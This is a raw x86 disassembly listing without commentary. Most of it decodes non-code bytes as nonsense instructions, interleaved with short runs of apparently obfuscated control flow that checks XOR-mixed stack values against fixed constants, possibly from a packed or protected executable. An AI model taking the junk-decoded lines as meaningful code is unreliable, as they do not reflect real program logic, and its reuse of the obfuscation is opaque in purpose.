  4018ed:	push   ecx
  4018ee:	cs cmp al,0xea
  4018f1:	push   cs
  4018f2:	inc    ecx
  4018f3:	scas   eax,DWORD PTR es:[edi]
  4018f4:	mov    bl,0x71
  4018f6:	div    DWORD PTR [edx+edx*4]
  4018f9:	mov    ds:0xa08c015a,al
  4018fe:	mov    ah,0x67
  401900:	push   ecx
  401901:	jns    0x401957
  401903:	xor    edi,0x70
  401906:	mov    bl,0xef
  401908:	cdq    
  401909:	(bad)  
  40190a:	mov    esi,0x1fcd068b
  40190f:	add    eax,0xe3512479
  401914:	push   ecx
  401915:	dec    edi
  401916:	ret    
  401917:	retf   
  401918:	hlt    
  401919:	das    
  40191a:	jno    0x401978
  40191c:	(bad)  
  40191d:	in     al,dx
  40191e:	ret    0x7acb
  401921:	std    
  401922:	(bad)  
  401923:	pop    ebx
  401924:	or     DWORD PTR [edx-0x1e3127a2],ebx
  40192a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40192b:	(bad)
  40192f:	mov    dh,BYTE PTR [eax+ebp*8]
  401932:	adc    DWORD PTR [esi-0x293fdfaa],0xd8fbdf12
  40193c:	xchg   edx,eax
  40193d:	scas   eax,DWORD PTR es:[edi]
  40193e:	out    dx,al
  40193f:	pushf  
  401940:	cs pop ebx
  401942:	push   ds
  401943:	adc    ah,BYTE PTR [ebx+0x71754c7f]
  401949:	or     bh,BYTE PTR [ebx]
  40194b:	xchg   ebp,eax
  40194c:	mov    DWORD PTR [ebp-0x1c],eax
  40194f:	mov    eax,DWORD PTR [ebp-0x1c]
  401952:	mov    DWORD PTR [eax],0xf89f2da9
  401958:	mov    eax,DWORD PTR [ebp-0x14]
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0x717bf628
  401994:	call   0x7ab03b8d
  401999:	jo     0x401a0b
  40199b:	jo     0x401a1b
  40199d:	jo     0x401a0f
  40199f:	std    
  4019a0:	mov    eax,ds:0x54f147da
  4019a5:	xchg   edi,eax
  4019a6:	sbb    BYTE PTR [edx-0x18],ch
  4019a9:	and    al,0x37
  4019ab:	sbb    DWORD PTR [ebp-0x8c05422],edx
  4019b1:	out    0xa4,eax
  4019b3:	fcmovnb st,st(3)
  4019b5:	inc    ebx
  4019b6:	cdq    
  4019b7:	sti    
  4019b8:	pop    ecx
  4019b9:	add    eax,0xdb822cfe
  4019be:	gs push 0x701cdb3a
  4019c4:	sub    al,0x5
  4019c6:	lds    ebx,FWORD PTR [edx]
  4019c8:	aam    0xc8
  4019ca:	aaa    
  4019cb:	jbe    0x4019f9
  4019cd:	ja     0x401a11
  4019cf:	push   ecx
  4019d0:	sub    DWORD PTR [ecx-0x464f6153],0xffffff87
  4019d7:	aam    0x10
  4019d9:	outs   dx,DWORD PTR ds:[esi]
  4019da:	adc    eax,0x52f139c4
  4019df:	outs   dx,DWORD PTR ds:[esi]
  4019e0:	mov    dl,0x57
  4019e2:	sub    esi,DWORD PTR [ebp-0x76]
  4019e5:	adc    bh,BYTE PTR [eax]
  4019e7:	xor    BYTE PTR [ecx*8-0x599a1cc3],al
  4019ee:	push   ebx
  4019ef:	jae    0x401975
  4019f1:	ds leave 
  4019f3:	xchg   ebp,eax
  4019f4:	cmp    cl,dh
  4019f6:	push   0xffffffbb
  4019f8:	mov    ch,0x2e
  4019fa:	jge    0x401a53
  4019fc:	sub    ecx,DWORD PTR [edx+0x6b61cb5f]
  401a02:	lods   eax,DWORD PTR ds:[esi]
  401a03:	adc    ch,BYTE PTR [ecx+ebp*1-0x7]
  401a07:	outs   dx,BYTE PTR ds:[esi]
  401a08:	and    esi,DWORD PTR [edi-0x722b488d]
  401a0e:	cdq    
  401a0f:	mov    DWORD PTR [ebx+0x57],esi
  401a12:	imul   DWORD PTR [ecx+0x5e59bc24]
  401a18:	adc    edx,DWORD PTR [esi-0x22]
  401a1b:	push   esp
  401a1c:	mov    dl,0xa6
  401a1e:	xchg   edx,eax
  401a1f:	or     edi,DWORD PTR [ecx-0x4c]
  401a22:	mov    ah,0x30
  401a24:	dec    esp
  401a25:	xchg   ecx,eax
  401a26:	clc    
  401a27:	test   DWORD PTR [eax+0x6e],ebp
  401a2a:	dec    ebp
  401a2b:	and    eax,ecx
  401a2d:	jecxz  0x401a23
  401a2f:	mov    ds:0x978fdbc2,eax
  401a34:	mov    ?,esp
  401a36:	xchg   ecx,eax
  401a37:	test   BYTE PTR [esi-0x10036ca2],ah
  401a3d:	fsubp  st(7),st
  401a3f:	hlt    
  401a40:	push   ebx
  401a41:	je     0x401a79
  401a43:	mov    cs,esi
  401a45:	bound  ebx,QWORD PTR [ecx]
  401a47:	mov    cl,0x6e
  401a49:	loopne 0x4019ed
  401a4b:	xchg   bh,dl
  401a4d:	sbb    al,0x18
  401a4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a50:	inc    ebx
  401a51:	test   eax,0x2c2d14e5
  401a56:	adc    al,BYTE PTR [esi+ebx*8+0x42]
  401a5a:	(bad)  
  401a5b:	mov    ebx,0xf40d86bb
  401a60:	stos   BYTE PTR es:[edi],al
  401a61:	outs   dx,DWORD PTR es:[esi]
  401a63:	mov    esp,0x2f200a70
  401a68:	pop    ebx
  401a69:	dec    ebp
  401a6a:	cmp    bh,BYTE PTR [esp]
  401a6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a6e:	mov    ds:0x4b15684f,al
  401a73:	cmp    ch,dh
  401a75:	pop    esp
  401a76:	jle    0x4019ff
  401a78:	je     0x401a7d
  401a7a:	pusha  
  401a7b:	sub    DWORD PTR fs:[ebx],esi
  401a7e:	push   ebx
  401a7f:	and    DWORD PTR gs:[ebx+0x39],0x5679944b
  401a87:	outs   dx,DWORD PTR ds:[esi]
  401a88:	je     0x401a7c
  401a8a:	iret   
  401a8b:	jbe    0x401b0a
  401a8d:	push   ecx
  401a8e:	and    bh,BYTE PTR [edi+edx*8-0x2]
  401a92:	jge    0x401ad5
  401a94:	enter  0xfda7,0x59
  401a98:	out    0xbc,eax
  401a9a:	aaa    
  401a9b:	jmp    0x689d8248
  401aa0:	call   0xecc2:0x9ce98f9e
  401aa7:	fdivr  QWORD PTR [eax]
  401aa9:	sbb    ah,BYTE PTR [eax+0x9]
  401aac:	push   edx
  401aad:	jbe    0x401a94
  401aaf:	shr    BYTE PTR [edi+0x7c],0xea
  401ab3:	xchg   esp,eax
  401ab4:	add    BYTE PTR [ecx],dl
  401ab6:	fisub  DWORD PTR [ecx-0x698403df]
  401abc:	mov    WORD PTR [esi-0x2e37382e],ss
  401ac2:	ja     0x401a82
  401ac4:	jmp    0x6daf6055
  401ac9:	mov    edx,ecx
  401acb:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  401acd:	inc    ebp
  401ace:	sahf   
  401acf:	mov    edx,0xad317a8b
  401ad4:	pusha  
  401ad5:	lea    ebx,[ebx+0x24]
  401ad8:	pop    es
  401ad9:	inc    ebx
  401ada:	call   eax
  401adc:	pop    esi
  401add:	sub    ebp,eax
  401adf:	call   DWORD PTR [ebx+0xa644f0b]
  401ae5:	test   eax,0x2306358c
  401aea:	cdq    
  401aeb:	in     eax,0xbc
  401aed:	adc    eax,0x9a1edbaf
  401af2:	dec    edi
  401af3:	les    edi,FWORD PTR ds:0xf8cf90a7
  401af9:	and    edx,edx
  401afb:	mov    al,0xe1
  401afd:	mov    ecx,0x3a977382
  401b02:	pop    ecx
  401b03:	gs pop ss
  401b05:	cmc    
  401b06:	rcr    BYTE PTR [edx-0x375e0d76],0x1a
  401b0d:	repnz push ebp
  401b0f:	sbb    bl,BYTE PTR [edx]
  401b11:	les    esi,FWORD PTR [esi]
  401b13:	int    0xf
  401b15:	fild   QWORD PTR [ebx-0x2bfd6ec3]
  401b1b:	add    bl,BYTE PTR [ecx+0x114404c0]
  401b21:	gs jb  0x401b13
  401b24:	xor    ecx,DWORD PTR [ecx]
  401b26:	not    DWORD PTR [ecx-0x29bf5d71]
  401b2c:	push   esi
  401b2d:	out    0xd2,al
  401b2f:	push   esp
  401b30:	push   es
  401b31:	sub    ah,BYTE PTR [ecx]
  401b33:	mov    al,ds:0x77449126
  401b38:	mov    bh,BYTE PTR [eax]
  401b3a:	in     eax,dx
  401b3b:	popf   
  401b3c:	enter  0x7473,0xb5
  401b40:	add    DWORD PTR [eax],edi
  401b42:	(bad)  
  401b43:	push   ecx
  401b44:	push   edx
  401b45:	out    dx,eax
  401b46:	ds in  al,dx
  401b48:	push   ecx
  401b49:	xchg   edi,eax
  401b4a:	clc    
  401b4b:	sub    DWORD PTR [edx-0x686154ed],eax
  401b51:	sbb    eax,DWORD PTR [edi+0x1d209fc6]
  401b57:	sub    eax,0xd7a397de
  401b5c:	mov    esi,0x497f10ff
  401b61:	inc    edx
  401b62:	xchg   ebx,eax
  401b63:	loop   0x401b7b
  401b65:	adc    esi,DWORD PTR [esi+0x32]
  401b68:	mov    edx,0xaeb3f692
  401b6d:	sub    al,BYTE PTR [ecx-0x72a73106]
  401b73:	(bad)  
  401b74:	xor    BYTE PTR [ecx],dh
  401b76:	sub    al,0x13
  401b78:	push   ds
  401b79:	jge    0x401bb8
  401b7b:	outs   dx,DWORD PTR ds:[esi]
  401b7c:	mov    bl,0x3c
  401b7e:	ja     0x401be8
  401b80:	pop    edi
  401b81:	sar    BYTE PTR [edx],cl
  401b83:	iret   
  401b84:	daa    
  401b85:	test   DWORD PTR [eax],edx
  401b87:	stc    
  401b88:	dec    esi
  401b89:	cmc    
  401b8a:	lahf   
  401b8b:	sbb    eax,0x3723031d
  401b90:	inc    ebp
  401b91:	mov    WORD PTR [esi],?
  401b93:	or     ah,BYTE PTR [ebx+0x4982a3e4]
  401b99:	pop    esp
  401b9a:	clc    
  401b9b:	pop    edx
  401b9c:	push   edi
  401b9d:	ins    DWORD PTR es:[edi],dx
  401b9e:	dec    edx
  401b9f:	mov    eax,DWORD PTR [ebp-0x10]
  401ba2:	mov    edx,DWORD PTR [eax]
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    bl,BYTE PTR [edx]
  401bdd:	fs jb  0x401bd9
  401be0:	jo     0x401c5a
  401be2:	jo     0x401c54
  401be4:	jo     0x401c64
  401be6:	jo     0x401c58
  401be8:	sahf   
  401be9:	cmp    cl,BYTE PTR [ecx+0x7b]
  401bec:	cli    
  401bed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bee:	push   edx
  401bef:	shl    DWORD PTR [ebp+0x23],0xeb
  401bf3:	push   ss
  401bf4:	dec    edx
  401bf5:	or     DWORD PTR [edi],edi
  401bf7:	xor    ch,bl
  401bf9:	shl    ah,0x7a
  401bfc:	jb     0x401c3f
  401bfe:	icebp  
  401bff:	(bad)  
  401c00:	or     eax,0x3412f842
  401c05:	fild   DWORD PTR [ebx+esi*4+0x4d96488]
  401c0c:	stos   BYTE PTR es:[edi],al
  401c0d:	pop    ebx
  401c0e:	lock lock xor DWORD PTR [ebx],edx
  401c12:	mov    al,ds:0xc4d72bee
  401c17:	imul   ebx,edi,0x7e
  401c1a:	les    edi,FWORD PTR [eax-0x45]
  401c1d:	mov    edx,0x1a0544d1
  401c22:	stos   BYTE PTR es:[edi],al
  401c23:	jbe    0x401c70
  401c25:	lock sub BYTE PTR [esi-0x2],ch
  401c29:	push   ds
  401c2a:	adc    BYTE PTR [edi+0x6f],al
  401c2d:	or     dl,BYTE PTR [edi+0x1]
  401c30:	xor    BYTE PTR ds:0xc0d97c52,ah
  401c36:	push   0xc3623e4
  401c3b:	das    
  401c3c:	sbb    edx,DWORD PTR [edi-0x54]
  401c3f:	jp     0x401c22
  401c41:	cdq    
  401c42:	xchg   edi,eax
  401c43:	xchg   esp,eax
  401c44:	rcl    DWORD PTR [esi+0x551dddb0],cl
  401c4a:	into   
  401c4b:	or     eax,0xe3cf42ef
  401c50:	xchg   esi,eax
  401c51:	pop    ds
  401c52:	out    0xc5,al
  401c54:	or     ecx,DWORD PTR [ecx]
  401c56:	sub    eax,0x11505f50
  401c5b:	stos   BYTE PTR es:[edi],al
  401c5c:	push   es
  401c5d:	add    BYTE PTR [ebx],al
  401c5f:	loopne 0x401c66
  401c61:	icebp  
  401c62:	jb     0x401cb3
  401c64:	fidivr WORD PTR [ebx+0x7c]
  401c67:	mov    cl,0xd1
  401c69:	inc    ebp
  401c6a:	mul    BYTE PTR [edi-0x7a2c6018]
  401c70:	pop    ebp
  401c71:	mov    dh,0x6f
  401c73:	mov    ebp,0x764f7e69
  401c78:	and    DWORD PTR [edx+ebp*2+0x65],ecx
  401c7c:	ins    DWORD PTR es:[edi],dx
  401c7d:	adc    al,0x6a
  401c7f:	ficom  DWORD PTR [edx-0x4b]
  401c82:	mov    eax,ds:0x207cc17e
  401c87:	inc    eax
  401c88:	push   0x153b7da1
  401c8d:	dec    esp
  401c8e:	call   0x3678:0x4226b2f7
  401c95:	je     0x401ce5
  401c97:	retf   
  401c98:	ins    DWORD PTR es:[edi],dx
  401c99:	xor    DWORD PTR [ecx],0x3a32fc32
  401c9f:	sub    BYTE PTR [edi],al
  401ca1:	pop    ebx
  401ca2:	jae    0x401c7d
  401ca4:	adc    DWORD PTR [ebx+0x3d],ecx
  401ca7:	sub    al,0x18
  401ca9:	push   edi
  401caa:	adc    al,BYTE PTR [esi]
  401cac:	cmp    esi,esi
  401cae:	mov    BYTE PTR [esi-0x4b],0x36
  401cb2:	mov    dl,al
  401cb4:	push   ss
  401cb5:	xlat   BYTE PTR ds:[ebx]
  401cb6:	add    BYTE PTR [edx],bl
  401cb8:	mov    dl,0x89
  401cba:	(bad)  
  401cbb:	pop    edi
  401cbc:	lock inc esi
  401cbe:	mov    bl,dl
  401cc0:	retf   
  401cc1:	or     al,0x74
  401cc3:	rcl    DWORD PTR ds:0x8d69107e,cl
  401cc9:	pop    edx
  401cca:	jmp    0x401cba
  401ccc:	sahf   
  401ccd:	je     0x401c7f
  401ccf:	sub    eax,0x9bf4c0d9
  401cd4:	sahf   
  401cd5:	adc    al,dl
  401cd7:	jo     0x401d0d
  401cd9:	mov    esi,0x9f33fe37
  401cde:	aam    0x35
  401ce0:	mov    DWORD PTR [ebx-0x664013fa],ecx
  401ce6:	and    ch,BYTE PTR [ebx]
  401ce8:	loopne 0x401d36
  401cea:	or     al,0xbd
  401cec:	into   
  401ced:	ret    
  401cee:	mov    edi,0xe1758fa5
  401cf3:	push   cs
  401cf4:	out    0xf6,eax
  401cf6:	dec    esp
  401cf7:	jne    0x401d0a
  401cf9:	sbb    edx,ebp
  401cfb:	inc    eax
  401cfc:	out    0xc1,eax
  401cfe:	in     eax,dx
  401cff:	pop    ebx
  401d00:	into   
  401d01:	add    edi,DWORD PTR [ebx+0x14]
  401d04:	dec    ebp
  401d05:	dec    esi
  401d06:	mov    bl,0x11
  401d08:	nop
  401d09:	jns    0x401cd1
  401d0b:	xor    bl,al
  401d0d:	mov    dl,0x36
  401d0f:	data16 mov al,0x81
  401d12:	test   BYTE PTR ss:[edi+0x50bb52c5],al
  401d19:	addr16 call 0x8549:0x8c5cb168
  401d21:	test   esp,edx
  401d23:	pop    ebp
  401d24:	pop    edx
  401d25:	iret   
  401d26:	adc    bl,BYTE PTR [ebp+0x4e0301d7]
  401d2c:	push   ecx
  401d2d:	or     eax,0x8a7bf06
  401d32:	lods   al,BYTE PTR ds:[esi]
  401d33:	pop    ecx
  401d34:	(bad)  
  401d35:	into   
  401d36:	sub    ecx,ebx
  401d38:	xor    ecx,DWORD PTR [ebp+0x413614e0]
  401d3e:	cdq    
  401d3f:	add    al,bl
  401d41:	ud0    ebx,DWORD PTR ds:0xb5e52583
  401d48:	cmc    
  401d49:	push   edi
  401d4a:	addr16 mov bh,0x9c
  401d4d:	addr16 mov edx,0x7e676c0d
  401d53:	loopne 0x401d76
  401d55:	fwait
  401d56:	les    ebp,FWORD PTR [eax]
  401d58:	and    BYTE PTR [ebp+edx*8+0x69],cl
  401d5c:	ins    BYTE PTR es:[edi],dx
  401d5d:	iret   
  401d5e:	xchg   ecx,eax
  401d5f:	sbb    eax,0xcca64f70
  401d64:	mov    esp,0x20479549
  401d69:	loop   0x401cfd
  401d6b:	mov    dh,bh
  401d6d:	imul   BYTE PTR [eax+0x2dadbc65]
  401d73:	jmp    0x401d6b
  401d75:	repnz push ebx
  401d77:	stos   BYTE PTR es:[edi],al
  401d78:	xlat   BYTE PTR ds:[ebx]
  401d79:	inc    esp
  401d7a:	out    0x51,al
  401d7c:	jne    0x401d26
  401d7e:	cmp    eax,0xf258fc3a
  401d83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d84:	lahf   
  401d85:	xchg   edx,eax
  401d86:	cmp    DWORD PTR ds:0x60d360f,ecx
  401d8c:	mov    eax,0x4b823603
  401d91:	mov    bh,BYTE PTR [edx-0x5d3ca5a1]
  401d97:	xchg   ebx,eax
  401d98:	jbe    0x401d83
  401d9a:	dec    edx
  401d9b:	fiadd  DWORD PTR ds:0x9ac7be1a
  401da1:	sbb    eax,0x5c04850
  401da6:	push   esp
  401da7:	cs es push cs
  401daa:	jge    0x401d42
  401dac:	retf   
  401dad:	icebp  
  401dae:	and    BYTE PTR [ecx-0x516fc505],0xd2
  401db5:	loopne 0x401dbf
  401db7:	xchg   ebx,eax
  401db8:	pop    esi
  401db9:	mov    BYTE PTR [ecx-0x50],dl
  401dbc:	jg     0x401e18
  401dbe:	mov    edx,0x8bafc6d6
  401dc3:	sub    edx,DWORD PTR [edx-0x440ade24]
  401dc9:	mov    esp,0x2a928dbe
  401dce:	inc    edi
  401dcf:	lods   eax,DWORD PTR ds:[esi]
  401dd0:	fdiv   st(7),st
  401dd2:	push   es
  401dd3:	jecxz  0x401d7b
  401dd5:	mov    edi,0xe77a07fa
  401dda:	xor    BYTE PTR ds:0x9bd7d35c,al
  401de0:	sub    al,0xc4
  401de2:	push   0xe2c3e8b0
  401de7:	jb     0x401dec
  401de9:	inc    ebp
  401dea:	call   0xca949b2c
  401def:	ins    BYTE PTR es:[edi],dx
  401df0:	je     0x401e04
  401df6:	mov    eax,DWORD PTR [ebp-0x10]
  401df9:	and    DWORD PTR [eax],0x751c99
  401dff:	jmp    0x40272d
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [esp+edi*8+0x49],dl
  401e44:	push   esp
  401e45:	dec    esi
  401e46:	jo     0x401e4e
  401e48:	jo     0x401eba
  401e4a:	jo     0x401eca
  401e4c:	jo     0x401ebe
  401e4e:	jno    0x401e22
  401e50:	inc    ecx
  401e51:	pop    esi
  401e52:	es inc dx
  401e55:	test   ebp,ebx
  401e57:	push   ebp
  401e58:	inc    ecx
  401e59:	test   edx,eax
  401e5b:	fist   WORD PTR [ebx+0x6bc417c9]
  401e61:	inc    ebp
  401e62:	mov    ebx,0x92b95193
  401e67:	(bad)  
  401e68:	outs   dx,BYTE PTR ds:[esi]
  401e69:	pusha  
  401e6a:	pop    ecx
  401e6b:	xlat   BYTE PTR ds:[ebx]
  401e6c:	mov    ecx,0xbec7385e
  401e71:	frstor [ebx]
  401e73:	stos   BYTE PTR es:[edi],al
  401e74:	pop    es
  401e75:	add    al,0xe0
  401e77:	xor    BYTE PTR [edx-0x1f],al
  401e7a:	cs xchg edx,eax
  401e7c:	push   0x184f185b
  401e81:	cmp    bl,bh
  401e83:	jno    0x401ebd
  401e85:	xchg   edx,eax
  401e86:	icebp  
  401e87:	lds    ecx,FWORD PTR [esi]
  401e89:	in     al,dx
  401e8a:	sbb    al,0xb6
  401e8c:	push   esp
  401e8d:	rol    DWORD PTR [ecx+edi*8],1
  401e90:	jns    0x401eda
  401e92:	mov    WORD PTR [edx+0x7db05e42],?
  401e98:	daa    
  401e99:	dec    esi
  401e9a:	retf   0xf0b0
  401e9d:	mov    cl,0x19
  401e9f:	and    BYTE PTR ds:0xa7e19586,ah
  401ea5:	data16 mov ch,0xf7
  401ea8:	xchg   ebx,eax
  401ea9:	mov    dl,0x15
  401eab:	mul    edi
  401ead:	out    0xee,al
  401eaf:	pop    edi
  401eb0:	xchg   edx,eax
  401eb1:	out    dx,al
  401eb2:	leave  
  401eb3:	in     al,0x3a
  401eb5:	das    
  401eb6:	cld    
  401eb7:	jmp    0x41bf0770
  401ebc:	jl     0x401ee5
  401ebe:	mov    ecx,ecx
  401ec0:	into   
  401ec1:	adc    al,0x28
  401ec3:	push   esp
  401ec4:	add    al,0x53
  401ec6:	pusha  
  401ec7:	xchg   ecx,eax
  401ec8:	aaa    
  401ec9:	jl     0x401ebf
  401ecb:	xor    al,0xd3
  401ecd:	lods   eax,DWORD PTR ds:[esi]
  401ece:	push   0xffffff95
  401ed0:	data16 jo 0x401eb4
  401ed3:	xchg   ebx,eax
  401ed4:	pop    es
  401ed5:	cmp    BYTE PTR [esi-0x69719fe6],ch
  401edb:	adc    BYTE PTR [ebp+0x33d92066],ch
  401ee1:	dec    ebx
  401ee2:	xchg   ebp,eax
  401ee3:	in     al,0xbe
  401ee5:	push   esp
  401ee6:	mov    ds:0xdef9e239,al
  401eeb:	nop
  401eec:	jo     0x401ead
  401eee:	(bad)  
  401eef:	fadd   QWORD PTR [edx+0x1b]
  401ef2:	sti    
  401ef3:	mov    edx,0x3ee2d30b
  401ef9:	punpckhwd mm4,QWORD PTR [esi-0x29]
  401efd:	das    
  401efe:	xor    esp,DWORD PTR [ebx-0x23]
  401f01:	hlt    
  401f02:	(bad)  
  401f03:	stos   BYTE PTR es:[edi],al
  401f04:	sahf   
  401f05:	mov    ah,0x5
  401f07:	and    BYTE PTR [edx-0x417cfc58],0xf8
  401f0e:	fcom   DWORD PTR [ecx]
  401f10:	inc    esp
  401f11:	or     DWORD PTR [ecx+0x65],ebx
  401f14:	pop    eax
  401f15:	inc    eax
  401f16:	mov    bl,0x84
  401f18:	lods   eax,DWORD PTR ds:[esi]
  401f19:	lea    ebp,fs:[edx]
  401f1c:	out    0x2a,al
  401f1e:	adc    eax,0x2009b88f
  401f23:	mov    al,ds:0x5fbc2d7b
  401f28:	test   DWORD PTR [eax],edi
  401f2a:	adc    DWORD PTR [ebx],esp
  401f2c:	or     al,BYTE PTR [edi]
  401f2e:	gs pop esi
  401f30:	mul    DWORD PTR [ebp-0x43]
  401f33:	ret    0xf880
  401f36:	adc    eax,0xee2da523
  401f3b:	loop   0x401ee7
  401f3d:	adc    cl,BYTE PTR [ebx-0x7c21fc22]
  401f43:	cli    
  401f44:	and    BYTE PTR [edx-0x13],ch
  401f47:	mov    ds:0x671ffd62,eax
  401f4c:	mov    ecx,0x8adab15
  401f51:	out    0x6f,eax
  401f53:	jp     0x401fbf
  401f55:	aaa    
  401f56:	and    dh,BYTE PTR [edx+0x58ac7a35]
  401f5c:	push   ss
  401f5d:	mov    edx,0x6f82f231
  401f62:	je     0x401f2f
  401f64:	sysenter 
  401f66:	adc    BYTE PTR [edi-0x1aeec15c],bh
  401f6c:	retf   
  401f6d:	(bad)  
  401f6e:	mov    eax,0x7ef4642c
  401f73:	aam    0x43
  401f75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f76:	pop    ebp
  401f77:	pop    esp
  401f78:	sahf   
  401f79:	lock iret 
  401f7b:	sbb    eax,0xc916e2ed
  401f80:	jmp    0x401f8b
  401f82:	xchg   edx,eax
  401f83:	(bad)  
  401f84:	xchg   edx,eax
  401f85:	sub    BYTE PTR [eax],bh
  401f87:	clc    
  401f88:	xchg   ebx,eax
  401f89:	mov    ah,BYTE PTR [esi+0x2c]
  401f8c:	ret    0xd218
  401f8f:	xchg   edi,eax
  401f90:	scas   al,BYTE PTR es:[edi]
  401f91:	cld    
  401f92:	test   eax,0xed63be15
  401f97:	mov    esp,0xf7ac00f0
  401f9c:	test   DWORD PTR [eax],edi
  401f9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f9f:	xchg   esp,eax
  401fa0:	xchg   esi,eax
  401fa1:	fcomp  DWORD PTR [ecx]
  401fa3:	mov    ah,0xa5
  401fa5:	inc    ebp
  401fa6:	pop    ecx
  401fa7:	jbe    0x401fc8
  401fa9:	pop    ebp
  401faa:	out    0x40,eax
  401fac:	jl     0x401f94
  401fae:	adc    esp,DWORD PTR [ecx*8-0x6590a5e1]
  401fb5:	cmc    
  401fb6:	xor    eax,0x5db97492
  401fbb:	adc    esp,eax
  401fbd:	cmp    al,0xa0
  401fbf:	scas   eax,DWORD PTR es:[edi]
  401fc0:	adc    BYTE PTR [ebx-0x4ee88bed],dh
  401fc6:	sar    DWORD PTR [ecx],0xbc
  401fc9:	sub    dh,bh
  401fcb:	dec    edx
  401fcc:	je     0x401f93
  401fce:	stos   DWORD PTR es:[edi],eax
  401fcf:	inc    ebp
  401fd0:	mov    ebx,0x69ef818c
  401fd5:	ror    BYTE PTR [esi+0x7a],cl
  401fd8:	jmp    FWORD PTR [edi+ebx*8+0x4cfe567b]
  401fdf:	sahf   
  401fe0:	lock nop
  401fe2:	or     al,BYTE PTR [ecx+0x2edf9444]
  401fe8:	and    bh,ah
  401fea:	dec    eax
  401feb:	outs   dx,BYTE PTR ds:[esi]
  401fec:	sbb    DWORD PTR [esi],0xffffffab
  401fef:	inc    esp
  401ff0:	dec    esi
  401ff1:	xor    eax,0x969e55cf
  401ff7:	sbb    DWORD PTR [edi+0x3],eax
  401ffa:	lods   al,BYTE PTR ds:[esi]
  401ffb:	fdiv   st,st(1)
  401ffd:	mov    DWORD PTR [ebp+0x33e11c7a],ecx
  402003:	shl    DWORD PTR [ecx+eiz*8+0xe],0x97
  402008:	pusha  
  402009:	and    al,0xf2
  40200b:	ds pushf 
  40200d:	mov    ch,bh
  40200f:	jp     0x40205d
  402011:	icebp  
  402012:	xchg   ecx,eax
  402013:	adc    BYTE PTR [ebp+0x74],dl
  402016:	mov    ds:0xabcabd16,eax
  40201b:	ret    0x6fb7
  40201e:	jno    0x402071
  402020:	or     edx,DWORD PTR [eax+0x1c]
  402023:	adc    eax,0x315709dc
  402028:	repnz dec ebp
  40202a:	push   es
  40202b:	xchg   esi,eax
  40202c:	cmp    DWORD PTR [edi-0x42ebbe04],edx
  402032:	mov    esi,0xc40fbd02
  402037:	mov    ebx,0xcfc9be7a
  40203c:	jnp    0x40206f
  40203e:	jg     0x40202d
  402040:	mov    bh,0xa8
  402042:	adc    BYTE PTR [edi+0xc539b34],0x32
  402049:	jo     0x402057
  40204b:	adc    esp,edx
  40204d:	pop    eax
  40204e:	mov    edx,DWORD PTR [ebp-0x28]
  402051:	mov    edx,DWORD PTR [edx]
  402053:	add    ax,di
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	sub    dh,0xba
  40206c:	ja     0x402048
  40206e:	jo     0x402074
  402070:	jo     0x4020e2
  402072:	jo     0x4020f2
  402074:	jo     0x4020e6
  402076:	retf   0xbc5c
  402079:	leave  
  40207a:	xchg   BYTE PTR [eax+0x44],ah
  40207d:	call   0xd05b610b
  402082:	mov    ebx,0x134ff6f4
  402087:	or     BYTE PTR [ecx+0x1],bl
  40208a:	rcr    DWORD PTR [edx],0xb8
  40208d:	imul   edi,edx,0xffffffef
  402090:	imul   edi,DWORD PTR [ebp+0x2f],0x68
  402094:	pop    edx
  402095:	call   0x7bfb:0xfd0af24a
  40209c:	lds    esi,FWORD PTR [edx+ebp*8]
  40209f:	and    DWORD PTR [ebp-0x505cbdd7],ebx
  4020a5:	jp     0x4020c2
  4020a7:	es mov es,ecx
  4020aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020ab:	leave  
  4020ac:	loopne 0x4020e1
  4020ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
